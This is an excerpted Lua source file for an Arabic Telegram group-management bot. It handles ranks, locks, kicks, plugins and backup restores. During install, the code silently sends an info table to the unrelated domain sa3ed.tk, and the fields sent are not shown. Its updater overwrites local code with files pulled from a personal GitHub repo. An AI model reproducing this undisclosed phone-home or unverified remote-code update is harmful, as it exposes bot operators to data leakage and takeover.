...
▀█████████▄           ██       ████████
██▀ │kgk ﹏ @kgkBR
│تم تطوير وبرمجة السورس من قبل kgkᐂ .
│@kgkBR
#-------------------------------------------------------------------
]]
...
kgk = Token:match("(%d+)")
redis:set(kgk..":VERSION",1)
redis:set(kgk..":SUDO_ID:",SUDO_USER)
redis:set(kgk..":DataCenter:",'German')
redis:set(kgk..":UserNameBot:",BOT_User)
redis:set(kgk..":NameBot:",BOT_NAME)
redis:hset(kgk..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
redis:set("TH3kgk_INSTALL","Yes")
info = {} 
...
https.request('https://sa3ed.tk/B_aaaa.?Info='..JSON.encode(info))
...
Bot_User = redis:get(kgk..":UserNameBot:")
SUDO_ID = tonumber(redis:get(kgk..":SUDO_ID:"))
SUDO_USER = redis:hgetall(kgk..'username:'..SUDO_ID).username
version = redis:get(kgk..":VERSION")
DataCenter = redis:get(kgk..":DataCenter:")
...
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..kgk..')\027[0;32m\n'
...
if msg.type == "pv" and redis:get(kgk..':mute_pv:'..msg.chat_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end

if redis:get(kgk..'sender:'..msg.sender_user_id_..':flood') then
...
if redis:get(kgk..'group:add'..msg.chat_id_) then 
...
msg.Rank = 1
elseif redis:sismember(kgk..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = 'المطور'
msg.TheRank = 'مطور البوت'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(kgk..':KARA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء الاساسي'
msg.TheRank = 'المنشىء الاساسي'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(kgk..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المنشىء'
msg.TheRank = 'المنشىء'
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(kgk..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'المدير' 
msg.TheRank = 'مدير البوت' 
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(kgk..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = 'الادمن'
msg.TheRank = 'ادمن في البوت'
msg.Rank = 6
elseif msg.GroupActive and redis:sismember(kgk..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
...
local lock_bots = redis:get(kgk..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(kgk..'lock_bots_by_kick'..msg.chat_id_) then
kick_user(msg.sender_user_id_, msg.chat_id_)
end
if msg.content_.members_[0].id_ == our_id and redis:get(kgk..':WELCOME_BOT') then
SUDO_USER = redis:hgetall(kgk..'username:'..SUDO_ID).username
sendPhoto(msg.chat_id_,msg.id_,redis:get(kgk..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(kgk..':NameBot:')..[[ .
...
if msg.GroupActive and redis:get(kgk..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
return false 
end
...
if msg.Admin then redis:srem(kgk..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
...
if msg.Admin then redis:srem(kgk..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(kgk..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.kgk then 
if msg.text and ScriptFile.ikgk then
for k, kgk in pairs(ScriptFile.kgk) do
local SearchText = msg.text:match(kgk)
if SearchText then
if not CheckFlood(msg) then
return false 
end

local GetMsg = ScriptFile.ikgk(msg,{msg.text:match(kgk)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",kgk.." | Plugin is: \27[1;32mScript.lua\27[0m")
...
if ScriptFile.dkgk then
if ScriptFile.dkgk(msg) == false then
return false
end
...
if Plug.kgk then 
if msg.text and Plug.ikgk then
for k, kgk in pairs(Plug.kgk) do
local SearchText = msg.text:match(kgk)
if SearchText then
if not CheckFlood(msg) then
return false
...
Mohammad = msg.text
if Mohammad then
if redis:sismember(kgk..'CmDlist:'..msg.chat_id_,Mohammad) then
mmdi = redis:hget(kgk..'CmD:'..msg.chat_id_,Mohammad)
msg.text = Mohammad:gsub(Mohammad,mmdi)
end
end
local GetMsg = Plug.ikgk(msg,{msg.text:match(kgk)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",kgk.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
print("The File "..name.." Not Runing in The Source kgk")
end 

end
else
print("The File Script.lua Not Runing in The Source kgk")
...
function tdcli_update_callback(data)
	...
	redis:srem(kgk..'users',msg.sender_user_id_)
	end
	...
	download_file('https://raw.githubusercontent.com/mohamed2512000/Googlefile/main/inc/Run.lua','./inc/Run.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'40% - |█████       |')
	download_file('https://raw.githubusercontent.com/mohamed2512000/Googlefile/main/inc/locks.lua','./inc/locks.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'60% - |███████     |')
	download_file('https://raw.githubusercontent.com/mohamed2512000/Googlefile/main/inc/Script.lua','./inc/Script.lua')
	EditMsg(data.message_.chat_id_,data.message_.id_,'80% - |█████████   |')
	download_file('https://raw.githubusercontent.com/mohamed2512000/Googlefile/main/inc/functions.lua','./inc/functions.lua')
	download_file('https://raw.githubusercontent.com/mohamed2512000/Googlefile/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
	download_file('https://raw.githubusercontent.com/mohamed2512000/Googlefile/main/plugins/games.lua','./plugins/games.lua')
...
msg.text = Mohammad:gsub(Mohammad,mmdi)
	...
	mmd = redis:get(kgk..":SUDO_ID:")
redis:hset(kgk..'username:'..tonumber(mmd),'username',msg.text)
	...
	redis:set(kgk..":SUDO_ID:",msg.text)
...
download(stk,32)
	...
	if redis:get(kgk..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID or redis:sismember(kgk..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(kgk..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(kgk..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(kgk..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
	msg.Admin = true
	end
	local lock_bots = redis:get(kgk..'lock_bots'..msg.chat_id_)
	ISBOT = false
	...
	if ZISBOT and redis:get(kgk..'lock_bots_by_kick'..msg.chat_id_) then
	kick_user(msg.sender_user_id_, msg.chat_id_)
	end
...
if redis:get(kgk..'lock:join:'..msg.chat_id_) then
kick_user(msg.sender_user_id_,msg.chat_id_)
	...
	if redis:get(kgk..'group:add'..msg.chat_id_) then
	redis:set(kgk..'group:name'..msg.chat_id_,msg.content_.title_)
	end
	end 
	
	elseif data.ID == "UpdateNewChat" then  
	if redis:get(kgk..'group:add'..data.chat_.id_) then
	redis:set(kgk..'group:name'..data.chat_.id_,data.chat_.title_)
	end
	...
	if redis:get(kgk..'group:add-100'..data.channel_.id_) then
	local linkGroup = (redis:get(kgk..'linkGroup-100'..data.channel_.id_) or "")
	local NameGroup = (redis:get(kgk..'group:name-100'..data.channel_.id_) or "")
	...
	redis:mset(
	kgk..'group:name'..k,IDS.Title,
	kgk..'num_msg_kgk'..k,5,
	kgk..'group:add'..k,true,
	kgk..'lock_link'..k,true,
	kgk..'lock_spam'..k,true,
	kgk..'lock_webpage'..k,true,
	kgk..'lock_markdown'..k,true,
	kgk..'lock_flood'..k,true,
	kgk..'lock_bots'..k,true,
	kgk..'mute_forward'..k,true,
	kgk..'mute_contact'..k,true,
	kgk..'mute_document'..k,true,
	kgk..'mute_inline'..k,true,
	kgk..'lock_username'..k,true,
	kgk..'replay'..k,true
	)
	redis:sadd(kgk..'group:ids',k) 

	if IDS.Admins then
	for user,ID in pairs(IDS.Admins) do
	redis:hset(kgk..'username:'..ID,'username',user)
	redis:sadd(kgk..'admins:'..k,ID)
	end
	end
	if IDS.Creator then
	for user,ID in pairs(IDS.Creator) do
	redis:hset(kgk..'username:'..ID,'username',user)
	redis:sadd(kgk..':MONSHA_BOT:'..k,ID)
	end
	end
	if IDS.Owner then
	for user,ID in pairs(IDS.Owner) do
	redis:hset(kgk..'username:'..ID,'username',user)
	redis:sadd(kgk..'owners:'..k,ID)
	end
	end
	end
	io.popen("rm -fr ../.telegram-cli/data/document/*")
	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• ** تم رفع النسخه‏‏ الاحتياطيه\n• ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(kgk..'group:ids')..' .*\n')
	end
	elseif data.ID == "UpdateUser" then  
	if data.user_.type_.ID == "UserTypeDeleted" then
	print("¦ userTypeDeleted")
	redis:srem(kgk..'users',data.user_.id_)
	elseif data.user_.type_.ID == "UserTypeGeneral" then
	local CheckUser = redis:hgetall(kgk..'username:'..data.user_.id_).username
	...
	redis:hset(kgk..'username:'..data.user_.id_,'username',USERNAME)
	end 
	end
	...
	local groups = redis:smembers(kgk..'group:ids')
	...
	local pv = redis:smembers(kgk..'users')
	local NumPvDel = 0
	for i = 1, #pv do
